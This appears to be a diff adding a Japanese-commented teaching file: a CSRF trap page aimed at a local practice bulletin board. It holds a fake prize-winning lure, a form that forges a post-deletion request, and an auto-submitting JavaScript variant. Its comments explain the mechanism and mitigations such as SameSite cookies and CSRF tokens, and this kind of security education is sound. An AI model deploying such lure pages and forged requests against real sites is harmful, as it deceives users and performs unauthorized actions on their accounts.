@@ -1,0 +1,135 @@
+<!--
+  =======================================================================
+  CSRF攻撃の罠ページ（学習用）
+
+  【このファイルの目的】
+  CSRF（Cross-Site Request Forgery）攻撃を体験するための罠ページ。
+  ログイン中のユーザーが、この罠ページのボタンを押すと、
+  掲示板の投稿が本人の意図なく削除される。
+
+  【攻撃の仕組み】
+  1. 被害者は掲示板アプリにログイン中（セッションCookieがブラウザに保存されている）
+  2. 被害者がこの罠ページを開き、ボタンをクリックする
+  3. フォームが掲示板アプリの削除エンドポイント（/posts/:id/delete）にPOSTリクエストを送信
+  4. ブラウザは同じドメイン（localhost:4567）へのリクエストなので、
+     セッションCookieを自動的に付与する
+  5. サーバーはCSRFトークンを検証しないため、正規のリクエストと区別できない
+  6. 投稿が削除される
+
+  【なぜ成功するか】
+  - ブラウザはフォーム送信時に、送信先ドメインのCookieを自動的に付与する
+  - サーバー側にCSRFトークンのチェックがないため、
+    「正規のフォームからの送信」と「罠ページからの送信」を区別できない
+
+  【使い方】
+  1. 掲示板アプリ（http://localhost:4567）にログインし、投稿を1件作成する
+  2. 作成した投稿のIDを確認する（削除ボタンのフォームのaction属性を確認）
+  3. 下のフォームの action の投稿IDを必要に応じて変更する（デフォルトは1）
+  4. 別タブでこのページ（http://localhost:4567/csrf_trap.html）を開く
+  5. 「当選ボタン」をクリック → 投稿が削除されることを確認
+  =======================================================================
+-->
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>おめでとうございます！</title>
+  <!--
+    CSSで派手なデザインにしているのは、ソーシャルエンジニアリングの手法。
+    「当選」「プレゼント」など魅力的な見た目で、ユーザーにボタンを押させる。
+    実際のCSRF攻撃でも、罠ページは無害で魅力的に見えるよう作られることが多い。
+  -->
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #ff6b6b, #ffd93d, #6bcb77);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      border-radius: 16px;
+      padding: 48px;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+      max-width: 480px;
+    }
+    h1 {
+      color: #e74c3c;
+      font-size: 28px;
+      margin-bottom: 16px;
+    }
+    p {
+      color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .btn-prize {
+      background: linear-gradient(135deg, #e74c3c, #c0392b);
+      color: white;
+      border: none;
+      padding: 16px 48px;
+      font-size: 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: transform 0.2s;
+    }
+    .btn-prize:hover {
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>当選おめでとうございます！</h1>
+    <p>
+      あなたは本日のラッキーユーザーに選ばれました！<br>
+      下のボタンを押して賞品をお受け取りください。
+    </p>
+
+    <!--
+      ★★★ ここがCSRF攻撃の本体 ★★★
+
+      このフォームは掲示板アプリの削除エンドポイントに直接POSTする。
+      ブラウザがセッションCookieを自動送信するため、
+      ログイン中のユーザーの投稿が削除される。
+
+      攻撃対象の投稿IDを変更するには、action の数字を変更する。
+    -->
+    <form action="http://localhost:4567/posts/1/delete" method="post">
+      <button type="submit" class="btn-prize">賞品を受け取る</button>
+    </form>
+
+    <!--
+      【発展】自動送信バリエーション
+
+      上の例ではユーザーのクリックが必要だが、JavaScriptで自動送信すれば
+      ページを開いただけで攻撃が成立する。より危険なパターン：
+
+        <form id="csrf-form" action="http://localhost:4567/posts/1/delete" method="post">
+        </form>
+        <script>document.getElementById('csrf-form').submit();</script>
+
+      → ページを開いた瞬間にフォームが自動送信され、ユーザーは何が起きたか気づかない。
+      → imgタグでGETリクエストを飛ばす手法もある（GETで副作用がある場合に有効）。
+
+      【補足】SameSite Cookie属性による緩和
+
+      最近のブラウザでは、Cookie の SameSite 属性がデフォルトで Lax に設定される。
+      Lax の場合、別サイトからのPOSTリクエストにはCookieが付かないため、
+      CSRF攻撃がブロックされる。ただし：
+        - 古いブラウザではデフォルトが None（= Cookie が送られる）
+        - GETリクエストには Lax でもCookieが付く（GETで副作用があると危険）
+        - SameSite だけに頼るのではなく、CSRFトークンとの多層防御が推奨される
+
+      この学習アプリではセッション設定で SameSite を指定していないため、
+      ブラウザのデフォルト動作に依存する。
+    -->
+  </div>
+</body>
+</html>
